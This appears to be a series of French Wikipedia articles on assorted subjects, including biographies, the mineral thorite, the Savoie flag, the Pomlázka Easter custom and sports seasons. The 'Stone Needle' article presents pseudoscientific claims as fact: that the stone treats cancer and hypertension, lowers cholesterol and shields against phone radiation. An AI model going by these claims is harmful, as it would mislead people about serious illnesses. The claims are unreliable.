Corinne Charbonnel est une astrophysicienne française née le à Clermont-Ferrand. Elle est aujourd'hui professeure associée à l'Observatoire de Genève et directrice de recherche au CNRS, spécialiste internationalement reconnue dans la recherche sur la structure, la formation et l'évolution des étoiles de petites masses et de masses intermédiaires, sur la nucléosynthèse stellaire et primordiale, ainsi que sur l’évolution chimique des amas d'étoiles et des galaxies.
Biographie.
Corinne Charbonnel est née en 1965 à Clermont-Ferrand, dans le Puy-de-Dôme (France). Après des études à l'université Blaise-Pascal de 1982 à 1986, elle étudie de 1986 à 1992 à l'université Toulouse-III-Paul-Sabatier où elle effectue à partir de septembre 1989 une thèse intitulée « Formation et destruction du lithium dans les étoiles. Implications cosmologiques » au Laboratoire d'astrophysique de l'Observatoire Midi-Pyrénées. Elle obtient en mai 1992 son doctorat ès sciences mention Astrophysique et Techniques spatiales. Elle effectue un post-doctorat à l'Observatoire de Genève entre juin 1992 et octobre 1993 puis devient boursière de l'Académie des sciences au Laboratoire d'astrophysique de l'Observatoire Midi-Pyrénées à Toulouse de novembre 1993 à octobre 1994. Sa carrière scientifique se poursuit entre les universités de Toulouse et de Genève. Elle est directrice de recherche au Laboratoire d'astrophysique de Toulouse et Tarbes (partie du CNRS) depuis 1994 et est en détachement à l'Observatoire de Genève depuis octobre 2002 où elle devient maître d'enseignement et de recherche. Elle devient professeure associée, toujours à l'Observatoire de Genève, le .
Activités scientifiques.
Les travaux de recherche de Corinne Charbonnel portent sur la structure, la formation et l'évolution des étoiles de petite masse et de masse intermédiaire, sur la nucléosynthèse stellaire et primordiale ainsi que sur l'évolution chimique des amas d'étoiles et des galaxies. Elle développe des modèles numériques permettant de prédire l’évolution des différents types d’étoiles et d'évaluer leur contribution à la production des éléments chimiques constituant l'univers. Astronome internationalement reconnue pour la qualité et la productivité de ses recherches, elle est l'auteur d'environ 300 publications. Elle donne régulièrement des exposés de revue dans des conférences internationales. Elle est également présidente de commissions scientifiques internationales. Elle a été présidente de la Société française d'astronomie et d'astrophysique de 2010 à 2012 et s'engage pour la promotion de l'astronomie. Ceci lui vaut la reconnaissance de ses pairs et des instances politiques chargées de la recherche et a été en conséquence élevée au titre de Chevalier de l'Ordre national du Mérite par la ministre française de la Recherche et de l'Enseignement supérieur. Elle est par ailleurs depuis 2015 présidente de la division G « Étoiles et physique stellaire » au sein de l'Union astronomique internationale après avoir été vice-présidente (2006-2009) puis présidente (2009-2012) de la commission 35 « Constitution stellaire » de cette division.

</doc>
<doc id="7902258" url="https://fr.wikipedia.org/wiki?curid=7902258" title="Argula von Grumbach">
Argula von Grumbach

Argula von Grumbach, née von Stauffen en 1492 à Beratzhausen (Bavière) et décédée le à Zeilitzheim, est une réformatrice et une écrivaine bavaroise. Elle s'est notamment illustrée par ses pamphlets en 1523, qui sont les premiers écrits féminins en faveur de la Réforme.
Biographie.
Argula von Stauffen est la fille de Bernardin von Stauffen et de Katharina von Toerring. Elle naît et grandit au sein d'une famille noble dans le château de l' dans la commune actuelle de Beratzhausen en Bavière. À l'âge de dix ans, son père lui offre une Bible illustrée en langue allemande et l'envoie chez la duchesse Cunégonde, une sœur de l'empereur Maximilien I afin de lui garantir une éducation digne de son rang. Bien qu'elle n'apprit pas le latin, elle apprit ainsi à lire et à écrire en allemand. Malheureusement, peu de temps après son entrée à la cour en 1509, ses deux parents décèdent dans un intervalle de cinq jours, probablement à cause de la peste. Son oncle et protecteur, Hieronymus, est exécuté quelques années plus tard. La jeune Argula se voit donc dans l'obligation de trouver un mari au plus vite. En 1516, elle épouse Frédéric von Grumbach. Ils ont une fille, Apollonia, et trois fils, Georg, Hans Georg et Gottfried.
Dès 1520, Argula von Grumbach se passionne pour les écrits de Martin Luther. Elle décide officiellement de prendre position en 1523, lorsque le professeur Arsacius Seehofer de l'université d'Ingolstadt est arrêté pour s'être rallié à la Réforme. Il est obligé d'abjurer (et donc de retirer ses propos). Elle écrit alors un violent pamphlet, où elle défie l'Université et propose d'organiser un débat avec ses membres. , dit-elle. Elle reproche particulièrement à l'Université de ne s'être appuyée sur aucune citation de la Bible lorsqu'elle a condamné Seehofer. C'est la première fois qu'une femme milite ouvertement pour la nouvelle pensée évangélique. Ce pamphlet a un tel retentissement qu'il est publié un peu partout dans le Saint-Empire. Il est par exemple édité au cours de la même année à Strasbourg par Martin Flach l'Ancien. Après ce succès, Argula écrit encore deux autres pamphlets. Elle y dénonce les pratiques du clergé et en particulier celles qui ont maintenu les femmes dans l'ignorance, leur proscrivant l'accès au savoir.
Les conséquences de ces publications ne se font pas attendre : son mari est démis de ses fonctions de "Pfleger" (un poste de l'administration) à Dietfurt dès . Privée de sources de revenus, la famille Von Grumbach plonge dans une situation précaire. Rongé par les inquiétudes financières, Frédéric von Grumbach devient violent avec sa femme et lui interdit d'écrire. Sa santé se détériore rapidement et il décède en 1529. L'année suivante, Argula rencontre Luther à Cobourg. En 1533, elle se remarie avec un partisan des idées luthériennes, le comte von Schilck, mais celui-ci décède à son tour deux ans à peine après leur mariage. La situation de l'écrivaine devient d'autant plus difficile qu'elle doit surmonter la perte de trois de ses enfants (Apollonia et Georg en 1539 et Hans Georg en 1544). Elle ne fait plus imprimer de textes, toutefois elle garde ses convictions et reste active, entretenant de nombreuses correspondances.
On ne sait que peu de choses sur la fin de sa vie. Pendant longtemps, on a cru qu'elle était décédée en 1554, mais il semblerait qu'elle ait vécu jusqu'en 1563. Sa tombe se trouve au cimetière luthérien de St-Sigismund à Zeilitzheim.
La mémoire d'Argula von Grumbach est célébrée le dans le .

</doc>
<doc id="7902260" url="https://fr.wikipedia.org/wiki?curid=7902260" title="Université Kwansei gakuin">
Université Kwansei gakuin

L' est une université privée japonaise située à Nishinomiya, dans la préfecture de Hyōgo.

</doc>
<doc id="7902265" url="https://fr.wikipedia.org/wiki?curid=7902265" title="Thorite">
Thorite

La thorite, (Th,U)SiO4, est un silicate de thorium rare qui cristallise dans le système tétragonal et qui est isomorphe avec le zircon et l'. C'est le minéral de thorium le plus courant et il est presque toujours fortement radioactif. Il a été nommé ainsi en 1829 pour refléter sa contenance en thorium. La thorite a été découverte en 1828 sur l'île de Løvøya, Norvège, par le minéralogiste Hans Morten Thrane Esmark qui envoya les premiers échantillons de ce minéral noir à son père Jens Esmark, professeur de minéralogie et de géologie.
Gîtes et gisements.
Les échantillons de thorite proviennent généralement de pegmatites, de roches effusives volcaniques, de veines hydrothermales et de roches métamorphiques. Ils se trouvent également dans les petits grains de sables détritiques. Les cristaux sont rares mais la thorite peut être trouvée sous la forme de cristaux prismatiques courts avec terminaison pyramidale.
La thorite est souvent associée avec le zircon, la monazite, la gadolinite, la , l'uraninite, l'yttrialite et le pyrochlore.
La thorite est un minerai important d'uranium. Une variété de thorite, appelée souvent « uranothorite », est particulièrement riche et a été exploitée comme minerai d'uranium à Bancroft, Ontario, Canada. D'autres variétés de thorite sont l"'orangite", une variété orange, et la "calciothorite", une variété impure avec des traces de calcium.
Propriétés.
La thorite est habituellement métamictisée et hydratée, la rendant optiquement isotrope et amorphe. En fonction des différences de composition, sa densité varie de . Sa dureté est de 4,5 et l'éclat est vitreux ou résineux. Sa couleur est normalement noire mais peut également être noir brunâtre, orange, orange jaunâtre et vert foncé. On peut la trouver associée à des oxydes d'uranium.
Du fait que la thorite est grandement radioactive, les échantillons sont souvent métamictisés. C'est un état trouvé dans les minéraux radioactifs qui résulte des effets destructeurs de son propre rayonnement sur sa structure cristalline. Cet effet peut détruire complètement la structure cristalline tout en laissant l’aspect extérieur inchangé.

</doc>
<doc id="7902266" url="https://fr.wikipedia.org/wiki?curid=7902266" title="Championnat de France masculin de handball de Nationale 1 2013-2014">
Championnat de France masculin de handball de Nationale 1 2013-2014

Le Championnat de France masculin de handball de Nationale 1 est le national.
Cette saison est la première avec trois poules.
Clubs de l'édition 2013-2014.
Malgré son titre de champion lors de la saison 2012-2013 Villeurbanne. La CNCG ne valide pas la qualification sportive, pour des motifs budgétaires. le club est réintégré dans la juste avant la reprise du championnat, créant ainsi une poule à .
Classements.
Poule 1.
En proie à des difficultés financières, le HBC Libourne est relégué en N3 et Cernay-Wattwiller est repêché
Poule 3.
Le Cernay-Wattwiller est finalement repêché du fait de la relégation administrative du HBC Libourne en N3.
Barrages d'accession.
Du fait des relégations administratives des Girondins de Bordeaux HBC et du SMV Vernon Saint-Marcel, trois des quatre clubs accèdent à la Division 2.
La CNCG a refusé l'engagement de Pau-Nousty en Division 2, si bien que l'Entente Strasbourg Schiltigheim Alsace Handball obtient la dernière place d'accession.

</doc>
<doc id="7902267" url="https://fr.wikipedia.org/wiki?curid=7902267" title="Drapeau de la Savoie">
Drapeau de la Savoie

Le drapeau de la Savoie est "de facto" le drapeau et le pavillon de la Savoie. Il se compose d'une croix blanche sur un fond rouge.
Description.
Le drapeau de la Savoie est composé d'une croix blanche sur fond rouge, appelée parfois "Croix de Savoie". Néanmoins, les proportions du drapeau, de la croix ou encore les couleurs précises utilisées ne sont pas réglementées ; le drapeau savoyard n'ayant aucun aspect officiel, il peut donc être fabriqué de plusieurs façons différentes.
Voici par exemple différents modèles de drapeau savoyard :
Histoire.
Armes des Humbertiens.
Le premier blason des "Humbertiens", à l'origine de la maison de Savoie, était "d'or à l'aigle de sable". Il s'agit de la « bannière traditionnelle de l'Empereur », que l'on retrouve meublant le blason de Maurienne.
Croix de Savoie.
Le drapeau de la Savoie reprend les armes des comtes et ducs de Savoie : "de gueules à la croix d'argent", dite aussi "croix de Savoie".
L'origine de cette croix de Savoie est incertaine et varie selon les sources. Toutefois, le premier usage attesté par les comtes de Maurienne, devenus comtes de Savoie, remonte à un pennon d'un sceau sur une charte datant de 1143, du comte Amédée III. Ce sceau est conservé à l'abbaye territoriale de Saint-Maurice d'Agaune. Toutefois son usage n'est pas constant et est alterné avec l'aigle, selon la politique guelfe ou gibeline des comtes. Jean Cabaret d'Orville, chroniqueur du , la faisait remonter à la participation à la seconde croisade du comte Amédée III. Toutefois, cet engagement remonte à 1147, soit quelques années après le sceau.
Le comte Amédée V l'adopte au et son usage devient définitif. La décision serait prise après la victoire, en 1315, d'Amédée V, venu en aide des chevaliers de Saint Jean contre les Ottomans à Rhodes. 
Ce blason est ainsi devenu l’emblème principal de la maison de Savoie.

</doc>
<doc id="7902268" url="https://fr.wikipedia.org/wiki?curid=7902268" title="Argula von Stauffen">
Argula von Stauffen



</doc>
<doc id="7902274" url="https://fr.wikipedia.org/wiki?curid=7902274" title="Leonor Fanny Borges">
Leonor Fanny Borges



</doc>
<doc id="7902277" url="https://fr.wikipedia.org/wiki?curid=7902277" title="Comunidor">
Comunidor



</doc>
<doc id="7902280" url="https://fr.wikipedia.org/wiki?curid=7902280" title="Vanéra">
Vanéra



</doc>
<doc id="7902285" url="https://fr.wikipedia.org/wiki?curid=7902285" title="Natalie Van Den Adel">
Natalie Van Den Adel

Natalie Van Den Adel, née le à Dordrecht, Pays-Bas, est une basketteuse néerlandaise. Sa sœur Lisa Van Den Adel, d'un an son année, est également internationale néerlandaise.
Biographie.
Elle joue la saison 2008/2009 en NCAA pour l'Université du Colorado pour 7 points et 3 rebonds de moyenne. En provenance du club de (Pays-Bas), cette arrière-ailière tournait à 20 points (64,4% à 2-pts, 43,8% à 3-pts), 5 passes décisives, 4,3 rebonds et 2,6 interceptions de moyenne pour 21,3 d’évaluation en sept rencontres de championnat néerlandais, elle signe en Anjou pour remplacer la tricolore Soana Lucet. Non conservée pour la saison suivante, elle est remplacée par la Française Amélie Pochet et signe pour le club espagnol de CD Zamarat. Après une première saison à 7,7 points, 3,0 rebonds et 2,4 passes décisives, elle signe pour une seconde saison avec le club espagnol.
Équipe nationale.
Elle dispute les qualifications du championnat d’Europe 2013 avec des statistiques de 6,9 points et 2,8 rebonds de moyenne en huit rencontres.

</doc>
<doc id="7902299" url="https://fr.wikipedia.org/wiki?curid=7902299" title="Pomlázka">
Pomlázka

Pomlázka (le fouet de Pâques, en tchèque: pomlázka, mrskačka, šmerkust, en slovaque: korbáč) est un rite populaire en Tchéquie et en Slovaquie qui se déroule le lundi de Pâques, lors duquel les jeunes garçons fouettent symboliquement les jeunes filles sur les fesses au moyen de petites branches de saule ou d'autres arbres fraîchement coupées.
Coutume.
Tôt le matin du lundi de Pâques, les jeunes garçons descendent dans la rue avec des pomlázkas. Ils se mettent à la recherche des fillettes, qui elles se cachent ou du moins font semblant de se tenir cachées. Les garçons cinglent ensuite les filles de leur fouet fait de jeunes branches de saule (également de bouleau ou de genévrier) qui sont décorées de rubans à leur extrémité. Les jeunes filles peuvent se délivrer en offrant des œufs peints (de nos jours également des œufs en chocolat) ou d'autres sortes de friandises.
Le mot pomlázka est apparenté selon toute apparence au protoslave "*moldъ" qui signifie jeune (cf. par exemple en serbo-croate "mlad", en polonais "młody", en russe "молодой / molodoj"). En se faisant fouetter, les jeunes filles rajeunissent. Elles recevraient ainsi la fraîcheur, la souplesse et la vitalité des jeunes branches de saule.
Pomlázka désigne également le fait d'offrir des œufs de Pâques décorés. 
En Tchéquie et en Slovaquie la coutume du fouettement au moyen de pomlázkas s'effectue en faisant le tour des maisons. Les fouets sont fabriqués à partir d'une demi-douzaine de branches de saule fermement serrées. Les garçons vont ainsi de porte en porte frapper les fesses des fillettes des alentours. Quelques chants spéciaux accompagnent cette joyeuse bastonnade. La fillette avait cependant le droit durant le rituel de verser un seau sur le garçon. 
Chez les Slaves orientaux, ce fouettement avec des branches de saule se retrouve plutôt la veille du dimanche des Rameaux, c'est-à-dire le Samedi de Lazare.

</doc>
<doc id="7902300" url="https://fr.wikipedia.org/wiki?curid=7902300" title="Les Géants du ciel">
Les Géants du ciel

Les Géants du ciel "()" est un film américain en Technicolor réalisé par Raoul Walsh, sorti en 1948.
Synopsis.
En 1943, en Angleterre, sur une base militaire aérienne américaine : une escadrille de bombardiers revient d'une mission au-dessus de l'Allemagne. Manque à l'appel le Major Ed Hardin. L'opérateur radio entre en contact avec Hardin, qui est en train de survoler la Manche. Pendant cette conversation, Hardin abat deux avions allemands. Plus tard, le Général Gilbert demande la cour martiale pour Hardin, en raison de plusieurs violations aux ordres lors des combats. Gilbert cherche en fait à faire un exemple de façon à décourager les jeunes pilotes de suivre son exemple. Mais le Général McCready rejette la demande de Gilbert, sous le prétexte que Hardin a fait partie des Tigres volants, où un tel comportement est encouragé. Lorsque le Colonel Bill Brickley est muté dans une autre unité, il recommande Hardin pour le remplacer.

</doc>
<doc id="7902301" url="https://fr.wikipedia.org/wiki?curid=7902301" title="Fighter Squadron">
Fighter Squadron



</doc>
<doc id="7902323" url="https://fr.wikipedia.org/wiki?curid=7902323" title="Stone Needle">
Stone Needle

Stone needle est une pierre dont les propriétés sont utilisées en médecine traditionnelle chinoise comme traitement parallèle à celui des plantes. Principalement outil de massage et d’acupuncture, la pierre est aussi portée en bijou. De son nom chinois "Bian Shi", appelée aussi « Bian stone » dans les pays anglo-saxons, la pierre stone needle est utilisée encore aujourd’hui en Chine dans les hôpitaux traditionnels pour masser en stimulant les points d’acupuncture, ce qui lui a valu son nom de « pierre aiguille.».
Historique.
Histoire.
Selon la médecine chinoise traditionnelle, le stone needle est une pierre qui peut guérir les maladies. Les plus anciennes écritures sur cette pierre remontent à « l’empereur jaune » qui en fait mention dans ses documents.
Selon le « Classique des documents », les stone needle étaient des pierres d’offrande qui servaient à fabriquer des instruments musicaux pour honorer l’empereur royal. De nombreux documents historiques prouvent que des outils stone needle authentiques sont fabriqués par les mêmes pierres provenant du sud –ouest de la Chine, à côté de la mer. Les mêmes qui servaient à fabriquer les instruments musicaux. D’ailleurs des fouilles ont révélé de nombreux outils stone needle déterrés à Juxian et Da wenkou. La thérapie stone needle est le plus ancien exercice médical chez l’être humain, il est apparu en Chine au Néolithique vers 20000 
Mécanisme de formation du stone needle.
Selon les recherches des scientifiques du bureau sismologique chinois, après leurs explorations géologiques des gisements de stone needle, ils ont découvert qu’il y a d’années, par orogenèse, des roches sédimentaires se sont formées par les mouvements naturels des montagnes et de la mer glacée. Il y a d’années, une météorite d’un diamètre de a percuté ce sol et explosé dans la région du sud-ouest de la province de Shandong en Chine. En raison de l’explosion de cette météorite, la surface des roches calcaires s’est volatilisée puis combinée dans l’air saturé avec la matière de la météorite. Dans cet environnement isoionique, sous haute pression et haute température, la matière est retombée sur terre pour former la pierre qui est aujourd’hui appelée stone needle. Il y a , la pierre était utilisée pour fabriquer des instruments musicaux en offrande pour le palais royal. Ces instruments musicaux furent utilisés par le bouddhisme, ou l’artéfact. Parallèlement, la pierre stone needle est aussi utilisée comme un outil de thérapie par le peuple chinois pour traiter les douleurs.
Caractéristiques du stone needle.
Les laboratoires de l’Académie des sciences, de la technologie nucléaire, du bureau de sismologie et de l’université de la médecine traditionnelle de Pékin ont obtenu des résultats comme ainsi après trois ans des recherches sur les caractéristiques physiques du stone needle Sibin:
1. Il produit un champ magnétique. 
2. Quand il agit sur la peau, il crée des rayonnements du lointain infrarouge qui peut servir comme traitement médical physique : Infra-thermothérapies dans des fréquences de l’ordre de .
3. Il peut créer des impulsions ultrasoniques à haute fréquence qui sont bénéfiques au corps humain. quand il est frotté à la peau, ces impulsions ultrasoniques atteignent en moyenne dans un champ de fréquence allant de à .
4. Il n’a pas de radioactivité, il n’est pas nocif.
5. Il est composé d’une trentaine d’éléments minéraux rares qui sont bénéfiques pour le corps humain : le strontium, le titane, le chrome, le manganèse, le zinc, etc. Parmi eux, il contient en plus grande quantité de strontium. C’est une roche calcite cristalline. Structure microcristalline avec des calcites Crystal &lt;. Cette pierre est très fine et lisse. Par contre, les calcites cristallines ne sont pas toutes des stone needle Sibin. Comme son nom l’indique « pierre aiguille », quand nous tapons doucement sur le corps avec les outils stone needle Sibin, nous ressentons comme une piqûre d’aiguille.
6. Quand il est en contact avec la peau, la détection de la microcirculation montre que la vitesse du sang dans les vaisseaux capillaires s’accélère. Boire de l’eau imprégnée par les pierres Sibin peut faire baisser le cholestérol.
7. Il appartient à la catégorie des outils médicaux. Il n’appartient pas à la catégorie des bijoux.
La couleur des pierres Sibin est naturellement jaune grisâtre. Après polissage, elle devient noire, et après avoir absorbé la graisse du corps, sa couleur noire devient plus intense et brillante.
Aspect de la pierre Sibin : la couleur de la pierre provenant de l’ancien bassin fluvial est gris-jaune, accompagné dans sa texture naturelle de traces blanches ou jaunes. Les pierres Sibin ne sont pas épaisses, environ .
Thérapie stone needle.
Stone needle désigne une pierre qui, selon la médecine traditionnelle Chinoise, peut guérir les maladies. Il y a des milliers d’années, nos ancêtres avaient commencé à modeler des outils pratiques et simples avec cette pierre pour traiter leurs maux. Avant que l’acupuncture et la moxibustion apparaissent, les anciens peuples chinois choisissaient certaines pierres pour former des outils thérapeutiques qui permettaient de traiter la morbidité de leurs corps. À cette époque-là, ils n’avaient pas de connaissances médicales comme aujourd’hui. Quand ils avaient mal, ils chauffaient des pierres et grattaient l’endroit douloureux. Petit à petit, ils ont découvert que certaines pierres bien spécifiques pouvaient guérir leurs maladies, puis ils ont conclu cette méthode comme une des essences de la médecine traditionnelle chinoise. La pierre qu’ils avaient choisie, car la plus efficace, est appelée en Chine "bian shi" ou aussi "bian stone" dans les pays anglo-saxons. La thérapie par la technique stone needle parle de l’utilisation des outils fabriqués avec les pierres stone needle pour effectuer des massages, des soins par pierre chaude, et d’autres opérations de traitements. Malheureusement, cette technique a été perdue au cours des générations et avait disparu à la dynastie Han. Pendant des siècles, cet héritage n’est qu’une histoire dans certains endroits. Ces dernières années, grâce aux nouvelles technologies, cette matière pour fabriquer les outils stone needle est localisée dans la province de Shan Dong au bord de l’ancien bassin fluvial Si Shui en Chine. Selon les médecins et spécialistes médicaux, les pierres flottant sur la terre de Si bin (ancien bassin fluvial Si shui) sont considérées comme la meilleure matière pour fabriquer les outils Stone needle. L’ancienne technique est enfin ravivée et également développée. 
Stone needle appartient à la catégorie des appareils médicaux, il n’appartient pas au domaine des bijoux. Aujourd’hui, grâce à la technologie, la pierre stone needle peut être façonnée sous différentes formes selon les besoins, jusqu’aux formes complexes des bijoux qui non seulement apportent des effets bienfaisants au corps, mais sont aussi de beaux objets à porter.
L’outil stone needle est un ancien appareil, et son utilisation est classée comme une des plus anciennes techniques traditionnelles médicales de «l’empereur jaune ». Il joue un rôle très important en médecine traditionnelle.
Pratiques cliniques.
Stone needle est souvent utilisé comme traitement médical supplémentaire dans les hôpitaux Chinois dans le cas de maladies qui ne peuvent être guéries seulement par des traitements médicamenteux. C’est un traitement de lithothérapie pour certaines maladies comme le cancer, l’hypertension, la paralysie par accident cérébro-vasculaire… Il a surtout des effets pour les maladies des cervicales, la périarthrite de l’épaule, les douleurs de dos, la migraine et les maladies sanguines. Il est aussi reconnu de nos jours pour ses nombreux effets bénéfiques par exemple pour détendre, calmer l’esprit, pour ses qualités antistress, antifatigue, sa capacité à relâcher les muscles, favoriser le sommeil, améliorer la mémoire, hydrater et détoxiquer le corps et aider la performance physique. Pour l’évaluation du stone needle, il faut non seulement voir son effet médical, mais aussi son effet global de protection de la santé. C'est-à-dire, qu’il faut l’utiliser en soins auto-administrés avant que la maladie n’apparaisse et pour l’empêcher d’arriver. Stone needle est reconnu en Chine comme élément de protection de la santé et son utilisation s’inscrit dans le cadre d’une hygiène de vie.
Effets selon utilisation.
_Effet de frottement
Par les frottements, porter cette pierre en stone needle est particulièrement recommandé pour soulager les douleurs des articulations et des muscles en stimulant la circulation sanguine. Porter cette pierre permet aussi de détendre l'esprit, de se protéger des nombreux rayonnements auxquels nous sommes soumis comme les téléphones portables et les ordinateurs.
__ Effet d’échauffement
Avec ses effets thermiques, il peut augmenter la microcirculation sanguine cutanée et soulager les douleurs.
__ Effets chimiques et biologiques
Les ondes ultrasoniques qu’il produit peuvent influencer dans le corps les processus chimique et biologiques, le métabolisme.
__ Effets pour le système nerveux.
Le système nerveux est sensible aux ondes ultrasoniques, une petite quantité d’ondes peut avoir une action inhibitrice sur les nerfs ou neurones en diminuant la vitesse de l’influx nerveux.
__ Autres effets.
Les ondes ultrasoniques peuvent accélérer les mouvements de l’estomac, stimuler la sécrétion du liquide gastrique, améliorer la circulation myocardique, augmenter la circulation sanguine du rein en dilatant les vaisseaux. 
Il améliore le système immunitaire, nettoie les facteurs toxiques dans le foie et les reins.
La thérapie stone needle commence souvent par un massage chauffé pour ouvrir les Méridiens du corps, puis par une série de traitement avec l’outil stone needle réchauffé. 
Cette thérapie peut être appliquée avec d’autres thérapies traditionnelles, par exemple, acupuncture ou ventouse pour atteindre l’effet optimal pour des maladies des vertèbres cervicales.
Références.
Le premier livre concernant la théorie du traitement et l’exercice clinique du stone needle est « les premières explorations par les traitements stone needle », il comprend .
« La thérapie appliquée par stone needle » introduit les méthodes diagnostiques et les traitements respectifs pour en médecine interne, en médecine externe, d'oto-rhino-laryngologie, gynécologiques, pédiatriques. Ce livre est spécialisé à la pratique des techniques stone needle.
« Les traitements des nouveaux stone needle », explique ce qu’est la pierre stone needle, sa découverte, son histoire, les pour prendre soin de notre santé avec stone needle, les différents outils stone needle et leur fabrication, les traitements stone needle pour .

</doc>
<doc id="7902324" url="https://fr.wikipedia.org/wiki?curid=7902324" title="Carine Brossais">
Carine Brossais

Carine Brossais le à Angers (France) est une joueuse française de basket-ball, évoluant au poste d'intérieure.
Biographie.
Formée à l'INSEP puis à Nantes-Rezé, elle revient dans sa ville natale où elle devient comptable, sans abandonner le basket-ball. Quatre années après avoir quitté la LFB, elle y fait son retour après le titre de championne de Ligue obtenu avec Angers en 2013. Relégué en 2011, le club ne passe qu'une saison en Nationale 1. En 2012-2013, Carine Brossais devient une des valeurs sûres de l'équipe avec 9,6 points, 5,6 rebonds, 10,6 d’évaluation.
Durant l'été 2014, elle rejoint Argenton en Nationale 1.

</doc>
<doc id="7902325" url="https://fr.wikipedia.org/wiki?curid=7902325" title="Fontaine du square Suzanne-Buisson">
Fontaine du square Suzanne-Buisson

La fontaine du square Suzanne-Buisson (plus communément appelée fontaine Suzanne-Buisson), est une fontaine située sur le square Suzanne-Buisson dans le de Paris. Elle a été créée en 1941 par le sculpteur Fernand Guignier. La fontaine et le square sont baptisés en hommage à Suzanne Buisson, une résidente de l'arrondissement morte en déportation.
Description.
La fontaine est composée d'un bassin semi-circulaire, dominé par la statue en pierre de Saint-Denis tenant sa tête entre ses mains. Selon la légende, c'est à cet endroit le saint aurait lavé sa tête après sa décollation en 280, avant de continuer son chemin avec sa tête dans les mains, vers la crypte de la basilique Saint-Denis, où il fut enterré.

</doc>
<doc id="7902326" url="https://fr.wikipedia.org/wiki?curid=7902326" title="Fontaine du Square Suzanne Buisson">
Fontaine du Square Suzanne Buisson



</doc>
<doc id="7902327" url="https://fr.wikipedia.org/wiki?curid=7902327" title="Škoda Rapid">
Škoda Rapid

Škoda Rapid est un nom d'automobiles du constructeur Škoda Auto :

</doc>
<doc id="7902332" url="https://fr.wikipedia.org/wiki?curid=7902332" title="Fontaine Suzanne-Buisson">
Fontaine Suzanne-Buisson



</doc>
<doc id="7902333" url="https://fr.wikipedia.org/wiki?curid=7902333" title="Karlsbrunn">
Karlsbrunn

Karlsbrunn est un Ortsteil de la commune allemande de Großrosseln en Sarre.

</doc>
<doc id="7902341" url="https://fr.wikipedia.org/wiki?curid=7902341" title="Elisabetta Gardini">
Elisabetta Gardini

Elisabetta Gardini, née le à Padoue, est une actrice de théâtre, une animatrice de télé et une femme politique italienne.
Biographie.
Sous les couleurs de Forza Italia, Elisabetta Gardini intègre le Parlement européen en 2008, remplaçant Renato Brunetta. Elle est réélue en 2009 puis en 2014, alors tête de liste de Forza Italia en Italie du Nord-Est.
Le 12 avril 2019, elle annonce quitter Forza Italia, estimant le parti déconnecté du terrain et des électeurs. Elle annonce toutefois se présenter pour un nouveau mandat européen en 2019, sous les couleurs du parti Frères d'Italie.

</doc>
<doc id="7902347" url="https://fr.wikipedia.org/wiki?curid=7902347" title="Aleksandr Ivanov (volley-ball, 1987)">
Aleksandr Ivanov (volley-ball, 1987)

Aleksandr Ivanov (en ) est un joueur russe de volley-ball né le . Il mesure et joue central.
Palmarès.
Néant.

</doc>
<doc id="7902354" url="https://fr.wikipedia.org/wiki?curid=7902354" title="Post Foods">
Post Foods

Post Foods est une entreprise agroalimentaire américaine.
Histoire.
En , Post Foods acquiert l'entreprise américaine de production et de distribution d’œuf et de lait Michael Foods pour 2,45 milliards de dollars.
En , Bright Food annonce vendre sa participation de 60 % dans Weetabix à Post Foods pour 1,4 milliard de livres. 
En , Post Holdings annonce pour 1,5 milliard de dollars l'acquisition de Bob Evans Farms, une entreprise américaine qui est présente tant dans la restauration que dans la production de surgelés.

</doc>
<doc id="7902356" url="https://fr.wikipedia.org/wiki?curid=7902356" title="Élise Prod'homme">
Élise Prod'homme

Élise Prod’homme le au Mans (Sarthe) est une joueuse, puis entraîneuse française de basket-ball.
Biographie.
Après une première saison en LFB réussie, Angers la prolonge pour deux nouvelles saisons.
Précieuse en défense, ses statistiques à Angers en 2015-2016 sont de 4,4 points (dont 31,4 % à trois points) et 1,2 rebond pour 2,8 d'évaluation en championnat et 7,7 points (33,3 % à trois points), 1,9 rebond et 1,3 passe décisive en Eurocoupe. Pour 2016-2017, elle choisit la Ligue 2 avec le relégué Calais. Elle retourne à l'Union Féminine "Angers" Basket 49 durant les saisons 2017-2018 et 2018-2019 où elle joue des matchs de coupe de France puis en 2019-2020 et 2020-2021 à l'AS Aulnoye-Aymeries en ligue féminine 2.
En janvier 2023, elle est nommée entraîneuse du groupe espoirs masculins de la JDA Dijon. En parallèle, après avoir été coach-assistante de l'équipe de France U16 Masculine durant l’été 2022 , elle est également en 2023 entraîneuse principale de l'équipe de France féminine U20 qui remporte le championnat d'Europe disputé en Lituanie du 29 juillet au .
En juillet 2025, elle conduit l'équipe de France masculine U18 à une médaille d'argent, battue 81 à 82 par l'Espagne. Elle est l'une des rares femmes à être entraîneuse principale d'une équipe masculine : .

</doc>
<doc id="7902358" url="https://fr.wikipedia.org/wiki?curid=7902358" title="Élise Prodhomme">
Élise Prodhomme



</doc>
<doc id="7902359" url="https://fr.wikipedia.org/wiki?curid=7902359" title="Elise Prodhomme">
Elise Prodhomme



</doc>
<doc id="7902360" url="https://fr.wikipedia.org/wiki?curid=7902360" title="Igor Tisevitch">
Igor Tisevitch

Igor Tisevitch (en ) est un joueur russe de volley-ball né le à Iaroslavl (oblast de Iaroslavl, alors en URSS). Il mesure et joue passeur. Il totalise 22 sélections en équipe de Russie.

</doc>
<doc id="7902368" url="https://fr.wikipedia.org/wiki?curid=7902368" title="Simona Bonafè">
Simona Bonafè

Simona Bonafè, née le à Varèse, est une personnalité politique italienne, membre du Parti démocrate (PD).
Biographie.
Pour les élections européennes de 2014, Simona Bonafè est tête de liste pour l'Italie centrale : elle obtient le plus grand nombre de voix de préférence de ces élections. Inscrite à La Marguerite depuis 2002, elle devient adjoint au maire de Scandicci en 2004, réélue en 2009.
Le elle est élue députée européenne d'Italie de la .
Elle est à nouveau tête de liste du Parti démocrate dans la circonscription Italie centrale pour les élections européennes de 2019 en Italie.
Le , elle est de nouveau élue députée pour la législature en Toscane sur la liste Parti démocrate - Italie démocrate et progressiste.

</doc>
<doc id="7902370" url="https://fr.wikipedia.org/wiki?curid=7902370" title="Bruno Seillier">
Bruno Seillier

Bruno Seillier est un scénariste, scénographe, metteur en scène et directeur artistique français. 
Formation et carrière.
Diplômé en histoire de l'Institut catholique de Vendée et en gestion de l'université Paris Dauphine, il se spécialise dans la mise en valeur du patrimoine militaire 
et religieux par des spectacles.
Scénographie.
En 2011, à l'occasion du Parvis des Gentils, une initiative du Conseil pontifical de la culture, il crée une scénographie pour la cathédrale Notre-Dame de Paris.
